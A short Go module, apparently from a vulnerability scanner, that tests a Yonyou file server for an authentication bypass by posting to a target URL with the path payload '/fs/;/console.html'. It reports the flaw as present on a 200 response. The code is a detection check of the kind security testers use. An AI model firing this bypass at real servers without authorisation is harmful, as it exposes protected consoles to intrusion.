package fs_rzBypass

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/fs/;/console.html"
	resp, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent": UA,
	}).Post(url)
	if err != nil {
		color.Red.Println("[-] 用友 文件服务器 认证绕过漏洞不存在")
		return
	}
	if resp.Status == "200 OK" {
		color.Green.Println("[+] 用友 文件服务器 认证绕过漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 文件服务器 认证绕过漏洞不存在")
}
